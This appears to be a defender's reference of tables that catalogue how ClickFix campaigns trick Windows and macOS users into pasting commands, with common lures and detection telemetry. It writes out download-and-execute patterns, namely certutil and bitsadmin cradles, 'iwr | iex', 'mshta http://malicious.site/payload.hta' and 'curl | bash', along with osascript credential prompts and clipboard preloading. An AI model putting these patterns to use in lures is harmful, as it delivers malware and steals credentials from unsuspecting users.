# ClickFix Command Execution Entry Points

## Windows

| Entry Point | Command/Binary | Description |
|---|---|---|
| **Run Dialog (Win+R)** | `powershell`, `mshta`, `cmd` | Most commonly abused entry point. Two keystrokes to open, paste, enter. Long commands are truncated in the dialog, hiding malicious payloads from the victim. Parent process is `explorer.exe`. |
| **PowerShell (direct)** | `powershell.exe`, `pwsh.exe` | User instructed to open PowerShell via Start menu search or right-click Start. No character length restriction like Run dialog. Supports `-enc` (base64), `-w hidden`, and `iwr | iex` download cradles. |
| **Command Prompt (direct)** | `cmd.exe` | User opens cmd via Start menu search. Typically wraps LOLBin download cradles like `certutil -urlcache -split -f` or `bitsadmin /transfer` to fetch and execute payloads. |
| **Windows Terminal** | `wt.exe` | Default terminal on Windows 10/11. Opens to PowerShell by default. Instructions to "open Terminal" route here on modern systems, achieving the same result as direct PowerShell. |
| **mshta.exe** | `mshta http://...` | Executes HTA files or inline VBScript/JScript outside the browser sandbox. Common pattern: `mshta http://malicious.site/payload.hta`. Can be called from Run dialog or command line. |
| **File Explorer address bar** | `cmd /c <command>` | Explorer's address bar accepts commands prefixed with `cmd /c` or direct executable paths. Less commonly observed in the wild but technically viable as a paste target. |
| **Browser DevTools (F12)** | JavaScript | User instructed to open DevTools console and paste JS. Doesn't directly execute system commands but can trigger downloads, redirect to malicious URI handlers (`ms-msdt:`, `search-ms:`), or invoke protocol handlers. |
| **Task Manager "Run new task"** | File > Run new task | Functionally identical to Run dialog but includes an "Create this task with administrative privileges" checkbox. Higher friction path makes it less common as a social engineering vector. |
| **Start Menu search bar** | Paste command/path | Typing or pasting a command into the Start/Search bar can execute it. PowerShell one-liners or executable paths pasted here will run. Some campaigns say "click Start and paste this." |
| **Protocol handler abuse** | `ms-msdt:`, `search-ms:`, `ms-officecmd:` | Tricking users into clicking crafted links that invoke Windows protocol handlers. Chains into command execution without a visible terminal. Related to ClickFix but uses click-based rather than paste-based lures. |
| **wscript / cscript** | `wscript.exe`, `cscript.exe` | Executes `.vbs` or `.js` script files. Some campaigns write a script to disk via the pasted command, then execute it through these interpreters. |
| **certutil / bitsadmin** | `certutil.exe`, `bitsadmin.exe` | LOLBins used as download cradles within pasted commands. `certutil -urlcache -split -f http://... payload.exe` is a common pattern. Not entry points themselves but key binaries in the execution chain. |

## macOS

| Entry Point | Command/Binary | Description |
|---|---|---|
| **Terminal (direct)** | `bash`, `zsh`, `sh` | Primary entry point. Users instructed to open Terminal via Spotlight or Launchpad and paste a command. Typically a `curl \| bash` or `osascript` chain. |
| **osascript** | `osascript -e '...'` | Executes AppleScript or JavaScript for Automation (JXA). Can prompt for credentials via native-looking password dialogs using `do shell script "..." with administrator privileges`. |
| **curl / wget piped to shell** | `curl -s http://... \| bash` | Classic download-and-execute pattern. Simple, effective, and the most commonly observed payload delivery method in macOS ClickFix campaigns. |
| **open command** | `open /path/to/app` | Launches applications, URLs, or files. Used to execute downloaded `.app` bundles or mount `.dmg` files after a curl download stage. |

## Cross-Platform Notes

| Aspect | Detail |
|---|---|
| **Clipboard preloading** | Lure pages use `navigator.clipboard.writeText()` or `document.execCommand('copy')` to load the malicious command into the victim's clipboard before prompting them to paste. |
| **Common lures** | Fake CAPTCHAs ("verify you are human"), fake error messages ("fix display error"), fake update prompts, fake document access gates. |
| **Key detection telemetry** | `RunMRU` registry keys, command-line logging, parent-child process relationships (especially `explorer.exe` spawning `powershell.exe`/`mshta.exe`), clipboard monitoring. |
